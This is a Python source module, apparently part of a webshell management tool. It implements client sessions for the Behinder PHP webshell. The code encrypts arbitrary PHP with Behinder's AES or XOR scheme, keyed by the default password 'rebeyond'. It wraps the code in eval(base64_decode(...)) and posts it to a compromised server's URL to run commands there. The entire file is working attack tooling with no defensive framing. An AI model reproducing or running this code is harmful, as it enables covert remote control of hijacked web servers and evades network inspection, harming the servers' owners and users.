import typing as t
import hashlib
import logging
import random
import base64

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import httpx

from ..core import exceptions

from ..core.base import (
    register_session,
    Option,
    OptionGroup,
    get_http_client,
)
from ..core.php_session_common import (
    PHPWebshellActions,
    PHPWebshellCommunication,
    php_webshell_action_options,
    php_webshell_communication_options,
)

logger = logging.getLogger("core.sessions.php_behinder")


def md5_encode(s):
    """Encode a string or bytes into MD5"""
    if isinstance(s, str):
        s = s.encode()
    return hashlib.md5(s).hexdigest()


def base64_encode(s):
    """Encode a string or bytes into base64"""
    if isinstance(s, str):
        s = s.encode("utf-8")
    return base64.b64encode(s).decode()


# To ensure the first 16 characters differ, prefix the payload with random data


def behinder_aes(payload: t.Union[str, bytes], key: bytes):
    """Encrypt payload in Behinder AES format"""
    pre = f"{random.randbytes(random.randint(1, 32)).hex()}|".encode()
    payload_bytes = pre + (payload.encode() if isinstance(payload, str) else payload)

    # Behinder's CBC is incorrect; it uses an all-zero IV with no randomness

    iv = b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    cipher = AES.new(key, AES.MODE_CBC, iv=iv)
    payload_padded = pad(payload_bytes, AES.block_size)
    return base64_encode(cipher.encrypt(payload_padded))


def behinder_xor(payload: t.Union[str, bytes], key: bytes):
    """Encrypt payload in Behinder XOR format"""
    pre = f"{random.randbytes(random.randint(1, 32)).hex()}|".encode()
    payload_bytes = pre + (payload.encode() if isinstance(payload, str) else payload)
    payload_xor = bytes([c ^ key[i + 1 & 15] for i, c in enumerate(payload_bytes)])
    return base64_encode(payload_xor)


@register_session
class PHPWebshellBehinderAES(PHPWebshellCommunication, PHPWebshellActions):
    session_type = "BEHINDER_PHP_AES"
    readable_name = "Behinder AES"
    conn_options: t.List[OptionGroup] = [
        {
            "name": "Basic Connection",
            "options": [
                Option(
                    id="url",
                    name="URL",
                    type="text",
                    placeholder="http://xxx.com",
                    default_value=None,
                    alternatives=None,
                ),
                Option(
                    id="password",
                    name="Password",
                    type="text",
                    placeholder="******",
                    default_value="rebeyond",
                    alternatives=None,
                ),
            ],
        },
        {
            "name": "Advanced Connection",
            "options": [
                Option(
                    id="timeout_refresh_client",
                    name="Refresh HTTP Session on timeout",
                    type="checkbox",
                    placeholder="Using the same PHPSESSID for long operations may block subsequent requests",
                    default_value=True,
                    alternatives=None,
                ),
                Option(
                    id="https_verify",
                    name="Verify HTTPS certificate",
                    type="checkbox",
                    placeholder=None,
                    default_value=True,
                    alternatives=None,
                ),
            ]
            + php_webshell_communication_options
            + php_webshell_action_options,
        },
    ]

    def __init__(self, session_conn: dict):
        super().__init__(session_conn)
        self.url = session_conn["url"]
        self.key = md5_encode(session_conn["password"])[:16].encode()
        self.https_verify = session_conn.get("https_verify", False)
        self.client = get_http_client(verify=self.https_verify)
        self.timeout_refresh_client = session_conn.get("timeout_refresh_client", True)

    async def php_eval_beforebody(self, code: str) -> t.Tuple[int, str]:
        # Behinder mishandles `|`; base64-encode to avoid it
        return await self.submit_http(f"eval(base64_decode({base64_encode(code)!r}));")

    async def submit_http(self, payload: t.Union[str, bytes]):
        data = behinder_aes(payload, self.key)
        try:
            response = await self.client.request(
                method="POST", url=self.url, content=data
            )
            return response.status_code, response.text
        except httpx.TimeoutException as exc:
            # Long operations (e.g., sleep 100) can trigger HTTP timeouts for a session id
            # The server keeps waiting for that session id
            # Reusing the same session id can block subsequent requests
            # Drop the session id and use another client for the request
            if self.timeout_refresh_client:
                logger.warning("HTTP request to target timed out; trying to refresh HTTP Client")
                self.client = get_http_client(verify=self.https_verify)
            raise exceptions.NetworkError("HTTP request to target timed out") from exc
        except httpx.HTTPError as exc:
            raise exceptions.NetworkError(
                "Failed to send HTTP request to target: " + str(exc)
            ) from exc


@register_session
class PHPWebshellBehinderXor(PHPWebshellCommunication, PHPWebshellActions):
    session_type = "BEHINDER_PHP_XOR"
    readable_name = "Behinder XOR"
    conn_options: t.List[OptionGroup] = [
        {
            "name": "Basic Connection",
            "options": [
                Option(
                    id="url",
                    name="URL",
                    type="text",
                    placeholder="http://xxx.com",
                    default_value=None,
                    alternatives=None,
                ),
                Option(
                    id="password",
                    name="Password",
                    type="text",
                    placeholder="******",
                    default_value="rebeyond",
                    alternatives=None,
                ),
            ],
        },
        {
            "name": "Advanced Connection",
            "options": [
                Option(
                    id="timeout_refresh_client",
                    name="Refresh HTTP Session on timeout",
                    type="checkbox",
                    placeholder="Using the same PHPSESSID for long operations may block subsequent requests",
                    default_value=True,
                    alternatives=None,
                ),
                Option(
                    id="https_verify",
                    name="Verify HTTPS certificate",
                    type="checkbox",
                    placeholder=None,
                    default_value=True,
                    alternatives=None,
                ),
            ]
            + php_webshell_communication_options
            + php_webshell_action_options,
        },
    ]

    def __init__(self, session_conn: dict):
        super().__init__(session_conn)
        self.url = session_conn["url"]
        self.key = md5_encode(session_conn["password"])[:16].encode()
        self.https_verify = session_conn.get("https_verify", False)
        self.client = get_http_client(verify=self.https_verify)
        self.timeout_refresh_client = session_conn.get("timeout_refresh_client", True)

    async def php_eval_beforebody(self, code: str) -> t.Tuple[int, str]:
        # Behinder mishandles `|`; base64-encode to avoid it
        return await self.submit_http(f"eval(base64_decode({base64_encode(code)!r}));")

    async def submit_http(self, payload: t.Union[str, bytes]):
        data = behinder_xor(payload, self.key)
        try:
            response = await self.client.request(
                method="POST", url=self.url, content=data
            )
            return response.status_code, response.text
        except httpx.TimeoutException as exc:
            # Long operations (e.g., sleep 100) can trigger HTTP timeouts for a session id
            # The server keeps waiting for that session id
            # Reusing the same session id can block subsequent requests
            # Drop the session id and use another client for the request
            if self.timeout_refresh_client:
                logger.warning("HTTP request to target timed out; refreshing HTTP client")
                self.client = get_http_client(verify=self.https_verify)
            raise exceptions.NetworkError("HTTP request to target timed out") from exc
        except httpx.HTTPError as exc:
            raise exceptions.NetworkError(
                "Failed to send HTTP request to target: " + str(exc)
            ) from exc
